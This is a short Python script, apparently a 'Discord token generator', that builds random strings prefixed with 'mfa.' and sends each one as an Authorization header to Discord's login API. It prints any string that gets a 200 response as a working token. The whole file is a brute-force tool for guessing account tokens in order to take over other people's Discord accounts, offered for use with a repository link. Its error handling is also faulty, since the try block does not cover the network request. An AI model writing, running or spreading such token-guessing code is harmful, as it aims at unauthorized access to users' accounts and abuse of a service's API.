import random
import os
import sys
import pyfiglet
import requests
from pathlib import Path

chars = "-abcdefghijklmnopq_rstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789"
ascii_banner = pyfiglet.figlet_format("Token  generator")
print(ascii_banner)
file_path = Path('tokens.txt') 


ilosc = input("How many tokens to generate: \n")
ilosc = int(ilosc)
os.system('cls')

print("Generating working tokens.....")
print("Please wait")

working = '[WORK] '
err = '[ERROR] '

for i in range(ilosc):
    token1 = ""
    token2 = ""

    for c in range(84):
        token1 += random.choice(chars)

    token2 = 'mfa.'

    token1 = str(token1)
    token2 = str(token2)



    token = token2 + token1 
    headers={
        'Authorization': token 
    }
    src = requests.get('https://discord.com/api/v6/auth/login', headers=headers)
    try:
        if src.status_code == 200:
            workingtoken = working + token
            print(workingtoken)
    except Exception:
        print("Yeah we can't contact discord.com")  


print("\n")
sys.stdout.write("\033[1;31m")
print("Tokens generated, if you want to copy tokens press [CTRL A] + [CTRL C]")
print("If no tokens have been generated, please restart the application and increase the number of tokens to be generated")
print("Source code: https://github.com/Weberowsky/Discord-tokens-generator")
sys.stdout.write("\033[0;0m")
input("")
